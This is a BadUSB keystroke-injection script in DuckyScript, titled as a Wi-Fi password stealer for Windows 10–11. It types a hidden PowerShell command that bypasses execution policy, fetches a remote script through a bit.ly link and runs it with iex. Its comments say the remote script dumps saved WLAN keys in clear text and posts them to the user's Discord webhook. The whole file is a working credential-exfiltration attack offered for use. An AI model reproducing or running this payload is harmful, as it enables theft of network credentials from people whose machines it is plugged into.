REM ###################################################################
REM #                                                                 |
REM # Title        : WLAN-Windows-Passwords-Discord-Exfiltration      |
REM # Author       : Aleff                                            |
REM # Description: A script used to stole target WLAN Passwords.      |
REM # Category     : Credentials                                      |
REM # Target       : Windows 10-11                                    |
REM # Version      : 1.0                                              |
REM #                                                                 |
REM ###################################################################

REM Payload Configuration
REM Commands:
REM   - powershell -w h -ep bypass
REM     This command will open a poweshell used for execute all the following commands
REM   - $discord=''
REM     It will declaire a variable named $discord
REM   - irm bit.ly/ENG-WLAN-Windows-Password | iex
REM     irm will download of bit.ly/ENG-WLAN-Windows-Password file and will be executed from iex
REM Requirements:
REM   - Internet connection on the target
REM   - $discord='<here>' Here, so in the '<here>' you should put your discord webhook like 'https://discordapp.com/api/webhooks/123...'
REM Notes:
REM   - The link bit.ly/ENG-WLAN-Windows-Password is just a redirect for https://raw.githubusercontent.com/aleff-github/my-flipper-shits/main/[BADUSB]%20WLAN%20Windows%20Passwords/Windows-netstat.ps1 that will reduce the command length necessary becouse the command size permitted is restricted

REM Windows-netstat.ps1
REM Commands:
REM   - netsh wlan show profile
REM     It will load all profile connection, so all the WiFi names of the target
REM   - Select-String '(?<=All User Profile\s+:\s).+'
REM     Use a REGEX that will take the most important returned data from the previous command, so the wlan names that it will stored in $wlan using $_.Matches.Value
REM   - $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
REM     Then the file will execute 'netsh wlan show profile $wlan key=clear' that will print the $wlan data with key in clear and it will select, using Select-String, the 'Key Content' using an another one REGEX. It will be stored in $passw var
REM   - $Body = @{..}
REM     Then will be created a valid Json object
REM   - Invoke-RestMethod...
REM     And it will be sent to '$discord' wehbook with the Json object '$Body' as a 'Post' payload like a normal web request
REM Requirements:
REM   - Nothing

REM REQUIRED - Provide Discord Webhook
DEFINE #z YOUR-DISCORD-WEBHOOK

DELAY 2000
GUI r
DELAY 250
STRING powershell -w h -ep bypass $discord='
STRING #z
STRINGLN ';irm bit.ly/ENG-WLAN-Windows-Password | iex
